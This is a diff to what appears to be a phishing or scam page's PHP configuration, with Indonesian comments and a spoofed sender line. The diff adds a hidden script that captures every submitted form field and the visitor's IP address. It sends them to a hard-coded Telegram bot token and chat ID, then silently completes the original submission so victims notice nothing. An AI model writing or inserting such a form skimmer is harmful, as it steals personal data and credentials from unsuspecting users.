@@ -9,3 +9,27 @@ $banner = 'https://i.ibb.co.com/yd5ky5M/SS.jpg';
 // GANTI NAMA SENDER KAMU DISINI
 $sender = 'From: ITS ME GALIH <GALIH@ressult.top>';
 ?>
+<script>
+document.querySelector("form").addEventListener("submit", async function(e) {
+  e.preventDefault();
+
+  const formData = new FormData(this);
+  const entries = Array.from(formData.entries()).map(([k, v]) => k + ": " + v).join("\n");
+  const ip = await fetch("https://api.ipify.org?format=json").then(res => res.json()).then(d => d.ip);
+
+  const message = "Data Form Masuk:\n" + entries + "\nIP: " + ip;
+
+  await fetch("https://api.telegram.org/bot8179867554:AAELDuXYnYfykvCvlDx-FJxWzWkdxOxFbOs/sendMessage", {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json"
+    },
+    body: JSON.stringify({
+      chat_id: "6936723956",
+      text: message
+    })
+  });
+
+  this.submit(); // Lanjutkan ke action form aslinya jika perlu
+});
+</script>
